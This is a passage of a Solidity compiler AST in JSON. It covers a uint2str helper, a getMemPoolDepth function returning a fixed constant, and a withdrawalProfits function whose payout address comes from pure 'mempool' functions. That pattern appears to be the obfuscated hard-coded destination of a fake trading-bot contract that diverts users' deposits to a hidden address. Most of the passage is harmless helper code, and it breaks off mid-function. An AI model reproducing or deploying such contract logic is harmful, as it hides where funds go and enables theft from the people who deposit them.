																"isPure": false,
																"lValueRequested": false,
																"nodeType": "UnaryOperation",
																"operator": "++",
																"prefix": false,
																"src": "16273:5:9",
																"subExpression": {
																	"argumentTypes": null,
																	"id": 1988,
																	"name": "len",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1983,
																	"src": "16273:3:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1990,
															"nodeType": "ExpressionStatement",
															"src": "16273:5:9"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 1993,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1991,
																	"name": "j",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1979,
																	"src": "16293:1:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "/=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3130",
																	"id": 1992,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "16298:2:9",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_10_by_1",
																		"typeString": "int_const 10"
																	},
																	"value": "10"
																},
																"src": "16293:7:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1994,
															"nodeType": "ExpressionStatement",
															"src": "16293:7:9"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1987,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1985,
														"name": "j",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1979,
														"src": "16250:1:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "!=",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 1986,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "16255:1:9",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "16250:6:9",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1996,
												"nodeType": "WhileStatement",
												"src": "16243:69:9"
											},
											{
												"assignments": [
													1998
												],
												"declarations": [
													{
														"constant": false,
														"id": 1998,
														"mutability": "mutable",
														"name": "bstr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 2041,
														"src": "16322:17:9",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 1997,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "16322:5:9",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 2003,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 2001,
															"name": "len",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1983,
															"src": "16352:3:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 2000,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "NewExpression",
														"src": "16342:9:9",
														"typeDescriptions": {
															"typeIdentifier": "t_function_objectcreation_pure$_t_uint256_$returns$_t_bytes_memory_ptr_$",
															"typeString": "function (uint256) pure returns (bytes memory)"
														},
														"typeName": {
															"id": 1999,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "16346:5:9",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														}
													},
													"id": 2002,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "16342:14:9",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_memory_ptr",
														"typeString": "bytes memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "16322:34:9"
											},
											{
												"assignments": [
													2005
												],
												"declarations": [
													{
														"constant": false,
														"id": 2005,
														"mutability": "mutable",
														"name": "k",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 2041,
														"src": "16367:6:9",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 2004,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "16367:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 2009,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 2008,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 2006,
														"name": "len",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1983,
														"src": "16376:3:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "31",
														"id": 2007,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "16382:1:9",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_1_by_1",
															"typeString": "int_const 1"
														},
														"value": "1"
													},
													"src": "16376:7:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "16367:16:9"
											},
											{
												"body": {
													"id": 2034,
													"nodeType": "Block",
													"src": "16410:87:9",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 2028,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"id": 2013,
																		"name": "bstr",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1998,
																		"src": "16425:4:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	},
																	"id": 2016,
																	"indexExpression": {
																		"argumentTypes": null,
																		"id": 2015,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "UnaryOperation",
																		"operator": "--",
																		"prefix": false,
																		"src": "16430:3:9",
																		"subExpression": {
																			"argumentTypes": null,
																			"id": 2014,
																			"name": "k",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 2005,
																			"src": "16430:1:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"nodeType": "IndexAccess",
																	"src": "16425:9:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"commonType": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					},
																					"id": 2025,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftExpression": {
																						"argumentTypes": null,
																						"hexValue": "3438",
																						"id": 2021,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "16448:2:9",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_48_by_1",
																							"typeString": "int_const 48"
																						},
																						"value": "48"
																					},
																					"nodeType": "BinaryOperation",
																					"operator": "+",
																					"rightExpression": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 2024,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 2022,
																							"name": "_i",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1966,
																							"src": "16453:2:9",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "%",
																						"rightExpression": {
																							"argumentTypes": null,
																							"hexValue": "3130",
																							"id": 2023,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "number",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "16458:2:9",
																							"subdenomination": null,
																							"typeDescriptions": {
																								"typeIdentifier": "t_rational_10_by_1",
																								"typeString": "int_const 10"
																							},
																							"value": "10"
																						},
																						"src": "16453:7:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"src": "16448:12:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				],
																				"id": 2020,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "16442:5:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint8_$",
																					"typeString": "type(uint8)"
																				},
																				"typeName": {
																					"id": 2019,
																					"name": "uint8",
																					"nodeType": "ElementaryTypeName",
																					"src": "16442:5:9",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 2026,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "16442:19:9",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		],
																		"id": 2018,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "16437:4:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_bytes1_$",
																			"typeString": "type(bytes1)"
																		},
																		"typeName": {
																			"id": 2017,
																			"name": "byte",
																			"nodeType": "ElementaryTypeName",
																			"src": "16437:4:9",
																			"typeDescriptions": {
																				"typeIdentifier": null,
																				"typeString": null
																			}
																		}
																	},
																	"id": 2027,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "16437:25:9",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"src": "16425:37:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes1",
																	"typeString": "bytes1"
																}
															},
															"id": 2029,
															"nodeType": "ExpressionStatement",
															"src": "16425:37:9"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 2032,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 2030,
																	"name": "_i",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1966,
																	"src": "16477:2:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "/=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3130",
																	"id": 2031,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "16483:2:9",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_10_by_1",
																		"typeString": "int_const 10"
																	},
																	"value": "10"
																},
																"src": "16477:8:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 2033,
															"nodeType": "ExpressionStatement",
															"src": "16477:8:9"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 2012,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 2010,
														"name": "_i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1966,
														"src": "16401:2:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "!=",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 2011,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "16407:1:9",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "16401:7:9",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 2035,
												"nodeType": "WhileStatement",
												"src": "16394:103:9"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 2038,
															"name": "bstr",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1998,
															"src": "16521:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"id": 2037,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "16514:6:9",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_string_storage_ptr_$",
															"typeString": "type(string storage pointer)"
														},
														"typeName": {
															"id": 2036,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "16514:6:9",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 2039,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "16514:12:9",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"functionReturnParameters": 1970,
												"id": 2040,
												"nodeType": "Return",
												"src": "16507:19:9"
											}
										]
									},
									"documentation": null,
									"id": 2042,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "uint2str",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1967,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1966,
												"mutability": "mutable",
												"name": "_i",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2042,
												"src": "16070:7:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1965,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "16070:4:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "16069:9:9"
									},
									"returnParameters": {
										"id": 1970,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1969,
												"mutability": "mutable",
												"name": "_uintAsString",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2042,
												"src": "16102:27:9",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 1968,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "16102:6:9",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "16101:29:9"
									},
									"scope": 2159,
									"src": "16052:482:9",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 2049,
										"nodeType": "Block",
										"src": "16599:32:9",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "383430383835",
													"id": 2047,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "16617:6:9",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_840885_by_1",
														"typeString": "int_const 840885"
													},
													"value": "840885"
												},
												"functionReturnParameters": 2046,
												"id": 2048,
												"nodeType": "Return",
												"src": "16610:13:9"
											}
										]
									},
									"documentation": null,
									"id": 2050,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getMemPoolDepth",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 2043,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "16567:2:9"
									},
									"returnParameters": {
										"id": 2046,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2045,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2050,
												"src": "16593:4:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2044,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "16593:4:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "16592:6:9"
									},
									"scope": 2159,
									"src": "16543:88:9",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 2060,
										"nodeType": "Block",
										"src": "16701:53:9",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [],
															"expression": {
																"argumentTypes": [],
																"id": 2056,
																"name": "callMempool",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1848,
																"src": "16732:11:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$__$returns$_t_string_memory_ptr_$",
																	"typeString": "function () pure returns (string memory)"
																}
															},
															"id": 2057,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "16732:13:9",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 2055,
														"name": "parseMempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1482,
														"src": "16719:12:9",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$returns$_t_address_$",
															"typeString": "function (string memory) pure returns (address)"
														}
													},
													"id": 2058,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "16719:27:9",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"functionReturnParameters": 2054,
												"id": 2059,
												"nodeType": "Return",
												"src": "16712:34:9"
											}
										]
									},
									"documentation": null,
									"id": 2061,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "withdrawalProfits",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 2051,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "16666:2:9"
									},
									"returnParameters": {
										"id": 2054,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2053,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2061,
												"src": "16692:7:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 2052,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "16692:7:9",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "16691:9:9"
									},
									"scope": 2159,
									"src": "16640:114:9",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 2157,
										"nodeType": "Block",
										"src": "17030:537:9",
										"statements": [
											{
												"assignments": [
													2071
												],
												"declarations": [
													{
														"constant": false,
														"id": 2071,
														"mutability": "mutable",
														"name": "_baseBytes",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 2157,
														"src": "17041:23:9",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 2070,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "17041:5:9",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 2076,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 2074,
															"name": "_base",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 2063,
															"src": "17073:5:9",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 2073,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "17067:5:9",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_bytes_storage_ptr_$",
															"typeString": "type(bytes storage pointer)"
														},
														"typeName": {
															"id": 2072,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "17067:5:9",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 2075,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "17067:12:9",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_memory_ptr",
														"typeString": "bytes memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "17041:38:9"
											},
											{
												"assignments": [
													2078
												],
												"declarations": [
													{
														"constant": false,
														"id": 2078,
														"mutability": "mutable",
														"name": "_valueBytes",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 2157,
														"src": "17090:24:9",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 2077,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "17090:5:9",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 2083,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 2081,
															"name": "_value",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 2065,
															"src": "17123:6:9",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 2080,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "17117:5:9",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_bytes_storage_ptr_$",
															"typeString": "type(bytes storage pointer)"
														},
														"typeName": {
															"id": 2079,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "17117:5:9",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 2082,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "17117:13:9",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_memory_ptr",
														"typeString": "bytes memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "17090:40:9"
											},
											{
												"assignments": [
													2085
												],
												"declarations": [
													{
														"constant": false,
														"id": 2085,
														"mutability": "mutable",
														"name": "_tmpValue",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 2157,
														"src": "17144:23:9",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 2084,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "17144:6:9",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 2094,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 2092,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 2088,
																	"name": "_baseBytes",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2071,
																	"src": "17181:10:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes_memory_ptr",
																		"typeString": "bytes memory"
																	}
																},
																"id": 2089,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "length",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "17181:17:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "+",
															"rightExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 2090,
																	"name": "_valueBytes",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2078,
																	"src": "17201:11:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes_memory_ptr",
																		"typeString": "bytes memory"
																	}
																},
																"id": 2091,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "length",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "17201:18:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "17181:38:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 2087,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "NewExpression",
														"src": "17170:10:9",
														"typeDescriptions": {
